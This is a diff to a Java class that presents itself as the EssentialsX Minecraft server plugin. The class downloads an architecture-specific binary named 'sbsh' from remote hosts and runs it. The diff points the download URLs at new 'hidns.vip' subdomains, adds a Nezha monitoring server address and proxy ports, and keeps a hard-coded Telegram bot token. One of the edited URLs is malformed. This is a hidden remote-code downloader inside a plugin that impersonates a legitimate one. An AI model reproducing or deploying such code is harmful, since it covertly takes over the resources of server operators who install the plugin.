@@ -44,11 +44,11 @@ public class EssentialsX extends JavaPlugin {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://github.com/pingmike2/test/releases/download/amd64/sbsh";
+            url = "https://amd64.sss.hidns.vip/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://github.com/pingmike2/test/releases/download/ard64/sbsh";
+            url = "https://arm64.sss.hidns.vip/sbsh";
         } else if (osArch.contains("s390x")) {
-            url = "https://github.com/pingmike2/test/releases/download/s390x/sbsh";
+            url = "https:/s390x.sss.hidns.vip/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
@@ -75,14 +75,14 @@ public class EssentialsX extends JavaPlugin {
         Map<String, String> env = pb.environment();
         env.put("UUID", "b21795d8-0257-4cd1-a13f-aef25d120aa3");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "");
-        env.put("NEZHA_PORT", "");
+        env.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
+        env.put("NEZHA_PORT", "443");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
+        env.put("HY2_PORT", "7034");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -92,8 +92,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "");
-        env.put("DISABLE_ARGO", "false");
+        env.put("NAME", "host2play");
+        env.put("DISABLE_ARGO", "true");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
